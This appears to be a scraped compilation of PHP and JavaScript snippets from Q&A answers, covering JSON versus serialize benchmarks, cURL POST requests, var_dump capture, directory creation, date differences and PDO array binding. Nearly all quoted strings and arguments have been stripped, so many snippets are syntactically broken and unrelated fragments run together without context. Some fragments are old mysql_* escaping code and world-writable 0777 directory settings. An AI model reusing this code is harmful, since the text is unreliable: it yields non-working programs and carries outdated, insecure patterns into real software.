<script>var number = "abcd";alert(number);</script>
<script>var details = {"name":"supun","age":456,"weight":"55"};alert(details);console.log(details);</script>
<?php $servername = "localhost"; $username = ""; $password = ""; $dbname=""; $conn = new mysqli($servername, $username, $password,$dbname); if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); } $sql = "SELECT id, name ,image FROM phone"; $result = $conn->query($sql); while($row =$result->fetch_assoc()){ $v[]=$row; } echo json_encode($v); $conn->close(); ?>
function showUser(fnc) { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var p=JSON.parse(this.responseText);} } }
<?php function escapeJSString($string, $encoding = { if ($encoding != $string = iconv($encoding, $flags = JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_UNESCAPED_SLASHES; $string = substr(json_encode($string, $flags), 1, -1); return " }
<?php $your_php_variable= 22; echo "<script type= ?>
<?php $username = 1; ?> <script type="text/javascript"> var myData = <?php echo $username ?>; console.log(myData); alert(myData); </script>
<?php ini_set( error_reporting(E_ALL); $testArray = fillArray(0, 5); $start = microtime(true); json_encode($testArray); $jsonTime = microtime(true) - $start; echo "JSON encoded in $jsonTime seconds\n"; $start = microtime(true); serialize($testArray); $serializeTime = microtime(true) - $start; echo "PHP serialized in $serializeTime seconds\n"; if ($jsonTime < $serializeTime) { printf("json_encode() was roughly %01.2f%% faster than serialize()\n", ($serializeTime / $jsonTime - 1) * 100); } else if ($serializeTime < $jsonTime ) { printf("serialize() was roughly %01.2f%% faster than json_encode()\n", ($jsonTime / $serializeTime - 1) * 100); } else { echo "Impossible!\n"; } function fillArray( $depth, $max ) { static $seed; if (is_null($seed)) { $seed = array( } if ($depth < $max) { $node = array(); foreach ($seed as $key) { $node[$key] = fillArray($depth + 1, $max); } return $node; } return }
JSON encoded in 0.067085981369 seconds. Size (1277772) PHP serialized in 0.12110209465 seconds. Size (1955548) JSON decode in 0.22470498085 seconds PHP serialized in 0.211947917938 seconds json_encode() was roughly 80.52% faster than serialize() unserialize() was roughly 6.02% faster than json_decode() JSON string was roughly 53.04% smaller than Serialized string
Serialize JSON encoded in 2.5738489627838 seconds PHP serialized in 5.2861361503601 seconds Serialize: json_encode() was roughly 105.38% faster than serialize() Unserialize JSON decode in 10.915472984314 seconds PHP unserialized in 7.6223039627075 seconds Unserialize: unserialize() was roughly 43.20% faster than json_decode()
JSON encoded in 2.23700618744 seconds PHP serialized in 1.3434419632 seconds JSON decoded in 4.0405561924 seconds PHP unserialized in 1.39393305779 seconds serialized size : 14549 json_encode size : 11520 serialize() was roughly 66.51% faster than json_encode() unserialize() was roughly 189.87% faster than json_decode() json_encode() string was roughly 26.29% smaller than serialize() $start = microtime( true ); for($i = 0; $i < 10000; $i++) { json_encode( $test ); } $jsonTime = microtime( true ) - $start; echo "JSON encoded in $jsonTime seconds<br>"; $start = microtime( true ); for($i = 0; $i < 10000; $i++) { serialize( $test ); } $serializeTime = microtime( true ) - $start; echo "PHP serialized in $serializeTime seconds<br>"; $test2 = json_encode( $test ); $start = microtime( true ); for($i = 0; $i < 10000; $i++) { json_decode( $test2 ); } $jsonDecodeTime = microtime( true ) - $start; echo "JSON decoded in $jsonDecodeTime seconds<br>"; $test2 = serialize( $test ); $start = microtime( true ); for($i = 0; $i < 10000; $i++) { unserialize( $test2 ); } $unserializeTime = microtime( true ) - $start; echo "PHP unserialized in $unserializeTime seconds<br>"; $jsonSize = strlen(json_encode( $test )); $phpSize = strlen(serialize( $test )); echo "<p>serialized size : " . strlen(serialize( $test )) . "<br>"; echo "json_encode size : " . strlen(json_encode( $test )) . "<br></p>"; if ( $jsonTime < $serializeTime ) { echo "json_encode() was roughly " . number_format( ($serializeTime / $jsonTime - 1 ) * 100, 2 ) . "% faster than serialize()"; } else if ( $serializeTime < $jsonTime ) { echo "serialize() was roughly " . number_format( ($jsonTime / $serializeTime - 1 ) * 100, 2 ) . "% faster than json_encode()"; } else { echo } echo if ( $jsonDecodeTime < $unserializeTime ) { echo "json_decode() was roughly " . number_format( ($unserializeTime / $jsonDecodeTime - 1 ) * 100, 2 ) . "% faster than unserialize()"; } else if ( $unserializeTime < $jsonDecodeTime ) { echo "unserialize() was roughly " . number_format( ($jsonDecodeTime / $unserializeTime - 1 ) * 100, 2 ) . "% faster than json_decode()"; } else { echo } echo if ( $jsonSize < $phpSize ) { echo "json_encode() string was roughly " . number_format( ($phpSize / $jsonSize - 1 ) * 100, 2 ) . "% smaller than serialize()"; } else if ( $phpSize < $jsonSize ) { echo "serialize() string was roughly " . number_format( ($jsonSize / $phpSize - 1 ) * 100, 2 ) . "% smaller than json_encode()"; } else { echo }
$config = array( ); print_r($config); print_r(json_decode(json_encode($config)));
Array ( [Frodo] => hobbit [Gimli] => dwarf [Gandalf] => wizard ) stdClass Object ( [Frodo] => hobbit [Gimli] => dwarf [Gandalf] => wizard )
<?php ini_set( error_reporting(E_ALL); function _count_depth($array) { $count = 0; $max_depth = 0; foreach ($array as $a) { if (is_array($a)) { list($cnt, $depth) = _count_depth($a); $count += $cnt; $max_depth = max($max_depth, $depth); } else { $count++; } } return array( $count, $max_depth + 1, ); } function run_test($file) { $memory = memory_get_usage(); $test_array = unserialize(file_get_contents($file)); $memory = round((memory_get_usage() - $memory) / 1024, 2); if (empty($test_array) || !is_array($test_array)) { return; } list($count, $depth) = _count_depth($test_array); $start = microtime(true); $json_encoded = json_encode($test_array); $json_encode_time = microtime(true) - $start; $start = microtime(true); json_decode($json_encoded); $json_decode_time = microtime(true) - $start; $start = microtime(true); $serialized = serialize($test_array); $serialize_time = microtime(true) - $start; $start = microtime(true); unserialize($serialized); $unserialize_time = microtime(true) - $start; return array( ); } $files = glob(dirname(__FILE__) . $data = array(); foreach ($files as $file) { if (is_file($file)) { $result = run_test($file); if ($result) { $data[] = $result; } } } uasort($data, function ($a, $b) { return $a[ }); $fields = array_keys($data[0]); ?> <table> <thead> <tr> <?php foreach ($fields as $f) { ?> <td style="text-align: center; border:1px solid black;padding: 4px 8px;font-weight:bold;font-size:1.1em"><?= $f; ?></td> <?php } ?> </tr> </thead> <tbody> <?php foreach ($data as $d) { ?> <tr> <?php foreach ($d as $key => $value) { ?> <?php $is_win = strpos($key, <?php $color = ($is_win && $value) ? <td style="text-align: center; vertical-align: middle; padding: 3px 6px; border: 1px solid gray; <?= $color; ?>"><?= $value . (($is_win && $value) ? <?php } ?> </tr> <?php } ?> </tbody> </table>
<?php ini_set( error_reporting(E_ALL); $testArray = fillArray(0, 5); $totalJsonTime = 0; $totalSerializeTime = 0; $totalJsonWins = 0; for ($i = 0; $i < 1000; $i++) { $start = microtime(true); $json = json_encode($testArray); $jsonTime = microtime(true) - $start; $totalJsonTime += $jsonTime; $start = microtime(true); $serial = serialize($testArray); $serializeTime = microtime(true) - $start; $totalSerializeTime += $serializeTime; if ($jsonTime < $serializeTime) { $totalJsonWins++; } } $totalSerializeWins = 1000 - $totalJsonWins; if ($totalJsonTime < $totalSerializeTime) { printf("json_encode() (wins: $totalJsonWins) was roughly %01.2f%% faster than serialize()\n", ($totalSerializeTime / $totalJsonTime - 1) * 100); } else { printf("serialize() (wins: $totalSerializeWins) was roughly %01.2f%% faster than json_encode()\n", ($totalJsonTime / $totalSerializeTime - 1) * 100); } $totalJsonTime = 0; $totalJson2Time = 0; $totalSerializeTime = 0; $totalJsonWins = 0; for ($i = 0; $i < 1000; $i++) { $start = microtime(true); $orig = json_decode($json, true); $jsonTime = microtime(true) - $start; $totalJsonTime += $jsonTime; $start = microtime(true); $origObj = json_decode($json); $jsonTime2 = microtime(true) - $start; $totalJson2Time += $jsonTime2; $start = microtime(true); $unserial = unserialize($serial); $serializeTime = microtime(true) - $start; $totalSerializeTime += $serializeTime; if ($jsonTime < $serializeTime) { $totalJsonWins++; } } $totalSerializeWins = 1000 - $totalJsonWins; if ($totalJsonTime < $totalSerializeTime) { printf("json_decode() was roughly %01.2f%% faster than unserialize()\n", ($totalSerializeTime / $totalJsonTime - 1) * 100); } else { printf("unserialize() (wins: $totalSerializeWins) was roughly %01.2f%% faster than json_decode()\n", ($totalJsonTime / $totalSerializeTime - 1) * 100); } if ($totalJson2Time < $totalSerializeTime) { printf("json_decode() was roughly %01.2f%% faster than unserialize()\n", ($totalSerializeTime / $totalJson2Time - 1) * 100); } else { printf("unserialize() (wins: $totalSerializeWins) was roughly %01.2f%% faster than array json_decode()\n", ($totalJson2Time / $totalSerializeTime - 1) * 100); } function fillArray( $depth, $max ) { static $seed; if (is_null($seed)) { $seed = array( } if ($depth < $max) { $node = array(); foreach ($seed as $key) { $node[$key] = fillArray($depth + 1, $max); } return $node; } return }
Array cache: array (size=2) Object cache: object(stdClass)[8] public This cache: object(Controller\Test)[8] protected
Array cache: object(stdClass)[7] public public Object cache: object(stdClass)[8] public This cache: object(stdClass)[8]
<?php require __DIR__. use SuperCache\SuperCache as sCache; sCache::cache( echo sCache::cache( ?>
$url = $data = array( $options = array( ) ); $context = stream_context_create($options); $result = file_get_contents($url, false, $context); if ($result === FALSE) { } var_dump($result);
<?php $url = $file_name; $fields = [ ]; $fields_string = http_build_query($fields); $ch = curl_init(); curl_setopt($ch,CURLOPT_URL, $url); curl_setopt($ch,CURLOPT_POST, count($fields)); curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string); curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); echo $result; ?>
function httpPost($url, $data) { $curl = curl_init($url); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); return $response; }
$client = new GuzzleHttp\Client(); $response = $client->request( [ ] ] ); $headers = $response->getHeaders(); $body = $response->getBody(); var_dump($headers, $body);
$url = $ch = curl_init($url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $xml); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($ch); curl_close($ch);
$response = wp_remote_post( $url, array( if ( is_wp_error( $response ) ) { } else { }
class HTTPRequester { /** * @description Make HTTP-GET call * @param $url * @param array $params * @return HTTP-Response body or an empty string if the request fails or is empty */ public static function HTTPGet($url, array $params) { $query = http_build_query($params); $ch = curl_init($url. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, false); $response = curl_exec($ch); curl_close($ch); return $response; } /** * @description Make HTTP-POST call * @param $url * @param array $params * @return HTTP-Response body or an empty string if the request fails or is empty */ public static function HTTPPost($url, array $params) { $query = http_build_query($params); $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $query); $response = curl_exec($ch); curl_close($ch); return $response; } /** * @description Make HTTP-PUT call * @param $url * @param array $params * @return HTTP-Response body or an empty string if the request fails or is empty */ public static function HTTPPut($url, array $params) { $query = \http_build_query($params); $ch = \curl_init(); \curl_setopt($ch, \CURLOPT_RETURNTRANSFER, true); \curl_setopt($ch, \CURLOPT_HEADER, false); \curl_setopt($ch, \CURLOPT_URL, $url); \curl_setopt($ch, \CURLOPT_CUSTOMREQUEST, \curl_setopt($ch, \CURLOPT_POSTFIELDS, $query); $response = \curl_exec($ch); \curl_close($ch); return $response; } /** * @category Make HTTP-DELETE call * @param $url * @param array $params * @return HTTP-Response body or an empty string if the request fails or is empty */ public static function HTTPDelete($url, array $params) { $query = \http_build_query($params); $ch = \curl_init(); \curl_setopt($ch, \CURLOPT_RETURNTRANSFER, true); \curl_setopt($ch, \CURLOPT_HEADER, false); \curl_setopt($ch, \CURLOPT_URL, $url); \curl_setopt($ch, \CURLOPT_CUSTOMREQUEST, \curl_setopt($ch, \CURLOPT_POSTFIELDS, $query); $response = \curl_exec($ch); \curl_close($ch); return $response; } }
class HTTPRequesterCase extends TestCase { /** * @description test static method HTTPGet */ public function testHTTPGet() { $requestArr = array("getLicenses" => 1); $url = "http: $this->assertEquals(HTTPRequester::HTTPGet($url, $requestArr), } /** * @description test static method HTTPPost */ public function testHTTPPost() { $requestArr = array("addPerson" => array("foo", "bar")); $url = "http: $this->assertEquals(HTTPRequester::HTTPPost($url, $requestArr), } /** * @description test static method HTTPPut */ public function testHTTPPut() { $requestArr = array("updatePerson" => array("foo", "bar")); $url = "http: $this->assertEquals(HTTPRequester::HTTPPut($url, $requestArr), } /** * @description test static method HTTPDelete */ public function testHTTPDelete() { $requestArr = array("deletePerson" => array("foo", "bar")); $url = "http: $this->assertEquals(HTTPRequester::HTTPDelete($url, $requestArr), } }
<?php function post_request($url, array $params) { $query_content = http_build_query($params); $fp = fopen($url, stream_context_create([ ], ] ])); if ($fp === FALSE) { fclose($fp); return json_encode([ } $result = stream_get_contents($fp); fclose($fp); return $result; }
<?php $fields = array( ); $files = array( array( ) ); $response = http_post_fields("http: ?>
<?php $r = new HttpRequest( $r->setOptions(array( $r->addPostFields(array( try { echo $r->send()->getBody(); } catch (HttpException $ex) { echo $ex; } ?>
<?php error_reporting(E_ALL); ini_set("display_errors", 1); include("./broken-script.php");
$array = [1,[2,3],4,[5,6[7,[8],[9,10]],11],12]],15]; ⇑
⇓ function myfunc($param1, $param2 $param3, $param4)
⇓ print "<a href=" ⌞⎽⎽⎽⎽⎽⎽⎽⎽⌟⌞⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⌟⌞⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⌟
⇓ echo "Some text", $a_variable, "and some runaway string ; success("finished"); ⇯
function header_fallback($value, $expires = time() + 90000) {
class xyz { ⇓ var $default = get_config("xyz_default");
function doStuff() { if (true) ⇦ print "yes"; } } ⇧
if((!($opt["uniQartz5.8"]!=$this->check58)) or (empty($_POST[ ($true) {echo"halp";} elseif((!$z)or%b){excSmthng(False,5.8)}elseif (False){
if (true) { if (false) { … } elseif ($whatever) { if ($something2) { … } else { … } } else { … } if (false) { … } else { … } } elseif (false) { … }
if ($link) { $href = "yes"; } else { $href = "no"; } echo "<a href=
if ($x) { x_is_true(); }; else { something_else(); };
if (true) $x = 5; elseif (false) $x = 6; $y = 7; ← else $z = 0;
<?php if ($x) { ?> html <?php } ?> <?php elseif ($y) { ?> html <?php } ?>
<?php if ($x) { ?> html <?php } elseif ($y) { ?> html <?php } ?>
if (true) { } echo "in between"; ← elseif (false) { } ?> text <?php ← else { }
foreach ($array as $i) { if ($i) { … } } else { … }
⇓ if (($foo < 7) && $bar) > 5 || $baz < 9) { ... } ↑
<?php ob_start(); var_dump($someVar); $result = ob_get_clean(); ?>
$demo = array( "bool" => false, "int" => 1, "float" => 3.14, "string" => "hello world", "array" => array(), "object" => new stdClass(), "resource" => tmpfile(), "null" => null, ); $debug_export = var_export($demo, true); ob_start(); var_dump($demo); $debug_dump = ob_get_clean(); $debug_printr = print_r($demo, true);
array ( array ( ), stdClass::__set_state(array( )), )
array(8) { ["bool"]=> bool(false) ["int"]=> int(1) ["float"]=> float(3.14) ["string"]=> string(11) "hello world" ["array"]=> array(0) { } ["object"]=> object(stdClass) } ["resource"]=> resource(4) of type (stream) ["null"]=> NULL }
Array ( [bool] => [int] => 1 [float] => 3.14 [string] => hello world [array] => Array ( ) [object] => stdClass Object ( ) [resource] => Resource id [null] => )
$circular = array(); $circular[ var_export($circular);
Warning: var_export does not handle circular references in example.php on line 3 array ( array ( ), )
function return_var_dump(){ $args=func_get_args(); ob_start(); call_user_func_array( return ob_get_clean(); }
function var_dump_str() { $argc = func_num_args(); $argv = func_get_args(); if ($argc > 0) { ob_start(); call_user_func_array( $result = ob_get_contents(); ob_end_clean(); return $result; } return }
function varDumpToString ($var) { ob_start(); var_dump($var); return ob_get_clean(); }
function assignVarDumpValueToString($object) { ob_start(); var_dump($object); $result = ob_get_clean(); return $result; }
function varDumpToErrorLog( $var=null ){ ob_start(); var_dump( $var); $grabbed_information = ob_get_contents(); ob_end_clean(); error_log( $grabbed_information); }
/** * recursively create a long directory path */ function createPath($path) { if (is_dir($path)) return true; $prev_path = substr($path, 0, strrpos($path, $return = createPath($prev_path); return ($return && is_writable($prev_path)) ? mkdir($path) : false; }
function makeDir($path) { $ret = mkdir($path); return $ret === true || is_dir($path); }
function makeDir($path) { return is_dir($path) || mkdir($path); }
function makedirs($dirpath, $mode=0777) { return is_dir($dirpath) || mkdir($dirpath, $mode, true); }
function wp_mkdir_p( $target ) { $wrapper = null; if( wp_is_stream( $target ) ) { list( $wrapper, $target ) = explode( } $target = str_replace( if( $wrapper !== null ) { $target = $wrapper . } $target = rtrim($target, if ( empty($target) ) $target = if ( file_exists( $target ) ) return @is_dir( $target ); $target_parent = dirname( $target ); while ( $target_parent = dirname( $target_parent ); } if ( $stat = @stat( $target_parent ) ) { $dir_perms = $stat[ } else { $dir_perms = 0777; } if ( @mkdir( $target, $dir_perms, true ) ) { if ( $dir_perms != ( $dir_perms & ~umask() ) ) { $folder_parts = explode( for ( $i = 1; $i <= count( $folder_parts ); $i++ ) { @chmod( $target_parent . } } return true; } return false; }
include_once("../include/session.php"); $lnum = $session->lnum; $directory = uploaded_labels; if (!file_exists($directory."/".$lnum)) { mkdir($directory."/".$lnum, 0777, true); }
$dirpath = "path/to/dir"; $mode = "0777"; is_dir($dirpath) || mkdir($dirpath, $mode, true);
$upload = wp_upload_dir(); $upload_dir = $upload[ $upload_dir = $upload_dir . if (! is_dir($upload_dir)) { mkdir( $upload_dir, 0700 ); }
$now = time(); $your_date = strtotime("2010-01-01"); $datediff = $now - $your_date; echo round($datediff / (60 * 60 * 24));
$earlier = new DateTime("2010-07-06"); $later = new DateTime("2010-07-09"); $diff = $later->diff($earlier)->format("%a");
$datetime1 = new DateTime("2010-06-20"); $datetime2 = new DateTime("2011-06-22"); $difference = $datetime1->diff($datetime2); echo .$difference->m. .$difference->d. print_r($difference);
Difference: 1 years, 0 months, 2 days DateInterval Object ( [y] => 1 [m] => 0 [d] => 2 [h] => 0 [i] => 0 [s] => 0 [invert] => 0 [days] => 367 )
$start = strtotime( $end = strtotime( $days_between = ceil(abs($end - $start) / 86400);
$date1 = new DateTime( $date2 = new DateTime( $days = $date2->diff($date1)->format(
/** * Number of days between two dates. * * @param date $dt1 First date * @param date $dt2 Second date * @return int */ function daysBetween($dt1, $dt2) { return date_diff( date_create($dt2), date_create($dt1) )->format( }
(unix_timestamp(DATE2) - unix_timestamp(DATE1)) / 86400
<?php $tz = $yearFrom = 1980; $yearTo = 2020; $verbose = false; function funcdiff($date2, $date1) { $now = strtotime($date2); $your_date = strtotime($date1); $datediff = $now - $your_date; return floor($datediff / (60 * 60 * 24)); } date_default_timezone_set($tz); $failures = 0; $tests = 0; $dom = array ( 0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 ); (array_sum($dom) === 365) || die("Thirty days hath September..."); $last = array(); for ($year = $yearFrom; $year < $yearTo; $year++) { $dom[2] = 28; if ($year % 4 === 0) { $dom[2] = 29; } if ($year % 100 === 0) { $dom[2] = 28; } if ($year % 400 === 0) { $dom[2] = 29; } for ($month = 1; $month <= 12; $month ++) { for ($day = 1; $day <= $dom[$month]; $day++) { $date = sprintf("%04d-%02d-%02d", $year, $month, $day); if (count($last) === 7) { $tests ++; $diff = funcdiff($date, $test = array_shift($last)); if ((double)$diff !== (double)7) { $failures ++; if ($verbose) { print "There seem to be {$diff} days between {$date} and {$test}\n"; } } } $last[] = $date; } } } print "This function failed {$failures} of its {$tests} tests between {$yearFrom} and {$yearTo}.\n";
$from=date_create(date( $to=date_create("2013-03-15"); $diff=date_diff($to,$from); print_r($diff); echo $diff->format(
$datetime1 = new DateTime( $datetime2 = new DateTime( $interval = $datetime1->diff($datetime2); echo $interval->format(
$datetime1 = date_create( $datetime2 = date_create( $interval = date_diff($datetime1, $datetime2); echo $interval->format(
date_default_timezone_set( $time1 = strtotime( $time2 = strtotime( echo floor( ($time2-$time1) /(60*60*24)); ^-- the output will be **1**
date_default_timezone_set( $date1 = new DateTime("2016-03-27"); $date2 = new DateTime("2016-03-29"); echo $date2->diff($date1)->format("%a"); ^-- the output will be **2**
$days = (strtotime($endDate) - strtotime($startDate)) / (60 * 60 * 24); print $days;
$start = $end = $diff = (strtotime($end)- strtotime($start))/24/3600; echo $diff;
$dt = Carbon::parse( echo $dt->diffInDays(Carbon::now());
$datediff = floor(strtotime($date1)/(60*60*24)) - floor(strtotime($date2)/(60*60*24));
function dateDiff($date1, $date2) { $diff = strtotime($date2) - strtotime($date1); return abs(round($diff / 86400)); } $date1 = "11-10-2018"; $date2 = "31-10-2018"; $dateDiff = dateDiff($date1, $date2); echo "Difference between two dates: ". $dateDiff . " Days ";
function howManyDays($startDate,$endDate) { $date1 = strtotime($startDate." 0:00:00"); $date2 = strtotime($endDate." 23:59:59"); $res = (int)(($date2-$date1)/86400); return $res; }
$startdatum = $_POST[ $einddatum = $_POST[ $now = strtotime($startdatum); $your_date = strtotime($einddatum); $datediff = $your_date - $now; $number = floor($datediff/(60*60*24)); for($i=0;$i <= $number; $i++) { echo date( }
$day = 15; $month = 11; $year = 2012; $days = (int)((mktime (0,0,0,$month,$day,$year) - time(void))/86400); echo "There are $days days until $day/$month/$year";
class App_Sandbox_String_Util { /** * Usage: App_Sandbox_String_Util::getDateDiff(); * @param int $your_date timestamp * @param bool $hr human readable. e.g. 1 year(s) 2 day(s) * @see http: * @see http: */ static public function getDateDiff($your_date, $hr = 0) { $now = time(); $datediff = $now - $your_date; $days = floor( $datediff / ( 3600 * 24 ) ); $label = if ($hr) { if ($days >= 365) { $years = floor($days / 365); $label .= $years . $days -= 365 * $years; } if ($days) { $months = floor( $days / 30 ); $label .= $days -= 30 * $months; } if ($days) { $label .= } } else { $label = $days; } return $label; } }
$early_start_date = date2sql($_POST[ $date = new DateTime($early_start_date); $date->modify( $date_a = new DateTime($early_start_date . $date_b = new DateTime($date->format( $interval = date_diff($date_a, $date_b); $time = $interval->format( $parsed = date_parse($time); $seconds = $parsed[ $second3 = $employee_information[ if ($second3 < $seconds) display_error(_( set_focus( set_focus( return FALSE; }
<?php $date1=date_create("2013-03-15"); $date2=date_create("2013-12-12"); $diff=date_diff($date1,$date2); echo $diff->format("%R%a days"); ?>
function get_daydiff($end_date,$today) { if($today== { $today=date( } $str = floor(strtotime($end_date)/(60*60*24)) - floor(strtotime($today)/(60*60*24)); return $str; } $d1 = "2018-12-31"; $d2 = "2018-06-06"; echo get_daydiff($d1, $d2);
<?php function dateDiff($firstDate,$secondDate){ $firstDate = strtotime($firstDate); $secondDate = strtotime($secondDate); $datediff = $firstDate - $secondDate; $output = round($datediff / (60 * 60 * 24)); return $output; } ?>
<?php echo dateDiff("2018-01-01","2018-12-31"); $firstDate = "2018-01-01"; $secondDate = "2018-01-01"; echo dateDiff($firstDate,$secondDate); ?>
<?php $start = date_create( $end = date_create(); $diff = date_diff( $start, $end ); echo echo $diff->y . echo $diff->m . echo $diff->d . echo $diff->h . echo $diff->i . echo $diff->s . echo
function daysSince($date, $date2){ $q = "SELECT DATEDIFF( $result = execQ($q); $row = mysql_fetch_array($result,MYSQL_BOTH); return ($row[0]);
function execQ($q){ $result = mysql_query( $q); if(!$result){echo ( return $result;
$d1 = \Carbon\Carbon::now()->subDays(92); $d2 = \Carbon\Carbon::now()->subDays(10); $days_btw = $d1->diffInDays($d2);
$start = strtotime( $end = strtotime( $days_between = ceil(abs($end - $start) / 86400);
mysql_query( $var = mysql_real_escape_string( mysql_query(
mysql_set_charset($charset); mysql_query("SET SQL_MODE= $var = mysql_real_escape_string( mysql_query(
mysql_set_charset($charset); $var = mysql_real_escape_string(" mysql_query("SELECT * FROM test WHERE name =
$var = $pdo->quote(" $stmt = $pdo->query("SELECT * FROM test WHERE name = $var LIMIT 1");
$stmt = $mysqli->prepare( $param = " $stmt->bind_param( $stmt->execute();
@echo 1 / 0; echo @(1 / 0); @$i / 0; @($i / 0); $c = @$_POST["a"] + @$_POST["b"]; $c = @foobar(); echo "Script was not terminated";
function bad_error_handler($errno, $errstr, $errfile, $errline, $errcontext) { echo "[bad_error_handler]: $errstr"; return true; } set_error_handler("bad_error_handler"); echo @(1 / 0);
function better_error_handler($errno, $errstr, $errfile, $errline, $errcontext) { if(error_reporting() !== 0) { echo "[better_error_handler]: $errstr"; } return true; }
<?php $my_file = @file ( die ("Failed opening file: error was $value = @$cache[$key]; ?>
public function CheckUsername($connection, $username) { try { $data = array(); $data[ $sql = "SELECT Username FROM" . $this->usersTableName . " WHERE Username = :Username"; return $this->ExecuteObject($connection, $sql, $data); } catch(Exception $e) { throw $e; } }
public function postLogin(Request $request) { $email = $request->get( $identity = $this->identification->findIdentityByEmailAddress($email); $this->identification->loginWithPassword( $identity, $request->get( ); }
public function postLogin() { $path = if ($this->identification->isUserLoggedIn()) { $path = } return new RedirectResponse($path); }
public function postLogin(Request $request) { $email = $request->get( $data = [ ]; try { $identity = $this->identification->findIdentityByEmailAddress($email); $token = $this->identification->loginWithPassword( $identity, $request->get( ); } catch (FailedIdentification $exception) { $data = [ ] } return new JsonResponse($data); }
public function loginWithPassword(Identity $identity, string $password): string { if ($identity->matchPassword($password) === false) { $this->logWrongPasswordNotice($identity, [ ]); throw new PasswordMismatch; } $identity->setPassword($password); $this->updateIdentityOnUse($identity); $cookie = $this->createCookieIdentity($identity); $this->logger->info( ], ], ]); return $cookie->getToken(); }
private function changeIdentityStatus(Entity\Identity $identity, int $status) { $identity->setStatus($status); $identity->setLastUsed(time()); $mapper = $this->mapperFactory->create(Mapper\Identity::class); $mapper->store($identity); }
class Database { protected $_conn; public function __construct($connection) { $this->_conn = $connection; } public function ExecuteObject($sql, $data) { } } abstract class Model { protected $_db; public function __construct(Database $db) { $this->_db = $db; } } class User extends Model { public function CheckUsername($username) { $sql = "SELECT Username FROM" . $this->usersTableName . " WHERE ..."; return $this->_db->ExecuteObject($sql, $data); } } $db = new Database($conn); $model = new User($db); $model->CheckUsername(
class Database { private static $connection; private static $current_query; ... public static function query($sql) { if (!self::$connection){ self::open_connection(); } self::$current_query = $sql; $result = mysql_query($sql,self::$connection); if (!$result){ self::close_connection(); $error = new Error(2,"There is an Error in the query.\n<b>Query:</b>\n{$sql}\n"); $error->handleError(); } return $result; } .... public static function find_by_sql($sql){ if (!is_string($sql)) return false; $result_set = self::query($sql); $obj_arr = array(); while ($row = self::fetch_array($result_set)) { $obj_arr[] = self::instantiate($row); } return $obj_arr; } }
class DomainPeer extends Database { public static function getDomainInfoList() { $sql = $sql .= $sql .= $sql .= $sql .= $sql .= $sql .= $sql .= $sql .= $sql .= return self::find_by_sql($sql); } .... }
<?php $ids=array(1,2,3,7,8,9); $db = new PDO(...); $stmt = $db->prepare( FROM table WHERE id IN(:an_array)' ); $stmt->bindParam( $stmt->execute(); ?>
<?php $ids = array(1,2,3,7,8,9); $db = new PDO(...); foreach($ids as &$val) $val=$db->quote($val); $in = implode( $stmt = $db->prepare( FROM table WHERE id IN( ); $stmt->execute(); ?>
<?php $ids = array(1, 2, 3, 7, 8, 9); $inQuery = implode( $db = new PDO(...); $stmt = $db->prepare( FROM table WHERE id IN( ); foreach ($ids as $k => $id) $stmt->bindValue(($k+1), $id); $stmt->execute(); ?>
(...) foreach ($ids as $k => $id) $stmt->bindValue(($k+1), $id); $stmt->execute();
$qMarks = str_repeat( $sth = $db->prepare("SELECT * FROM myTable WHERE id IN ($qMarks)"); $sth->execute($ids);
public static function bindParamArray($prefix, $values, &$bindArray) { $str = ""; foreach($values as $index => $value){ $str .= ":".$prefix.$index.","; $bindArray[$prefix.$index] = $value; } return rtrim($str,","); }
$bindString = helper::bindParamArray("id", $_GET[ $userConditions .= " AND users.id IN($bindString)";
$ids = array(1,2,3,7,8,9); $db = new PDO(...); $stmt = $db->prepare( FROM table WHERE id = ANY (string_to_array(:an_array, ); $stmt->bindParam( $stmt->execute();
$ids = array(1,4,7,9,45); $param = "{".implode( $cmd = $db->prepare("SELECT * FROM table WHERE id = ANY (?)"); $result = $cmd->execute(array($param));
class Array_Capable_PDO extends PDO { /** * Both prepare a statement and bind array values to it * @param string $statement mysql query with colon-prefixed tokens * @param array $arrays associatve array with string tokens as keys and integer-indexed data arrays as values * @param array $driver_options see php documention * @return PDOStatement with given array values already bound */ public function prepare_with_arrays($statement, array $arrays, $driver_options = array()) { $replace_strings = array(); $x = 0; foreach($arrays as $token => $data) { $replace_string_pieces = array(); foreach($data as $y => $value) { $replace_string_pieces[] = ":{$x}_{$y}"; } $replace_strings[] = $x++; } $statement = str_replace(array_keys($arrays), $replace_strings, $statement); $prepared_statement = $this->prepare($statement, $driver_options); $x = 0; foreach($arrays as $token => $data) { foreach($data as $y => $value) { $prepared_statement->bindValue(":{$x}_{$y}", $value); } $x++; } return $prepared_statement; } }
$db_link = new Array_Capable_PDO($dsn, $username, $password); $query = ' SELECT * FROM test WHERE field1 IN :array1 OR field2 IN :array2 OR field3 = :value $pdo_query = $db_link->prepare_with_arrays( $query, array( ) ); $pdo_query->bindValue( $pdo_query->execute();
$total_items = count($array_of_items); $question_marks = array_fill(0, $total_items, $sql = $stmt = $dbh->prepare($sql); $stmt->execute(array_values($array_of_items));
$ids = array(1,2,3,7,8,9); $db = new PDO(...); $query = FROM table WHERE X = :x AND id IN( $comma = for($i=0; $i<count($ids); $i++){ $query .= $comma. $comma = } $query .= $stmt = $db->prepare($query); $stmt->bindValue( for($i=0; $i<count($ids); $i++){ $stmt->bindValue( } $stmt->execute();
